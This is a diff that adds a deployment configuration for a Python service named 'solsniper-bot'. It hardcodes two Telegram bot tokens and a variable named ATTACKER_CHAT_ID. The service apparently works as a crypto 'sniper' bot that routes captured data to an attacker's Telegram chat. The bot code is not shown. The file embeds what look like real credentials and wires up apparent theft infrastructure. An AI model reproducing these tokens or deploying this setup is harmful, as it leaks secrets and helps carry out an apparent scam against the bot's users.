@@ -1,0 +1,14 @@
+services:
+  - type: web
+    name: solsniper-bot
+    runtime: python
+    buildCommand: pip install -r requirements.txt
+    startCommand: python main_bot.py
+    envVars:
+      - key: MAIN_BOT_TOKEN
+        value: 8296111824:AAG5ok4TRaNBoTQAVhALEW1K4jGiUR317kM
+      - key: MONITOR_BOT_TOKEN
+        value: 7789920610:AAEzQd2V4KrRU87gk7yvYl99aV3sx4Jkb4U
+      - key: ATTACKER_CHAT_ID
+        value: 7429331053
+    plan: free
